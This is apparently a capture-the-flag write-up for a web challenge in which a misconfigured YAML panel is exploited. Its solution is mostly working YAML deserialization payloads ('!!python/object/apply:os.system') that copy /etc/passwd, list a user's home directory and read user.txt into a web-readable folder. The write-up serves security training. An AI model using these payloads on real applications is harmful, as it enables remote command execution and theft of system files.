*A junior developer set up an internal configuration panel using YAML. Unfortunately, they didn’t realize how dangerous it can be.*

*Can you misconfigure your way into the system and retrieve the user flag?*

*🧩 Your goal: Obtain the contents of `user.txt` located in the home directory of a low-privileged user.*

*🌐 Deployed at: [https://cybersecure-x-misconfigvault.chals.io](https://cybersecure-x-misconfigvault.chals.io)*


Leak /etc/passwd

Paste this into the GUI form:

`!!python/object/apply:os.system ["cp /etc/passwd /app/templates/passwd.txt"]`

Then visit:

https://cybersecure-x-misconfigvault.chals.io/view?file=passwd.txt

✔️ You discover:

ctfuser:x:1000:1000::/home/ctfuser:/bin/bash

List files in /home/ctfuser

`!!python/object/apply:os.system ["ls -la /home/ctfuser > /app/templates/ls_ctf.txt"]`

View:

/view?file=ls_ctf.txt

result
-r-------- 1 ctfuser ctfuser 33 Jun 6 12:00 user.txt

🔹 Step 3: Dump the user.txt flag

`!!python/object/apply:os.system ["cat /home/ctfuser/user.txt > /app/templates/userflag.txt"]`

View:

/view?file=userflag.txt

Flag:

`flag{user_access_granted}`


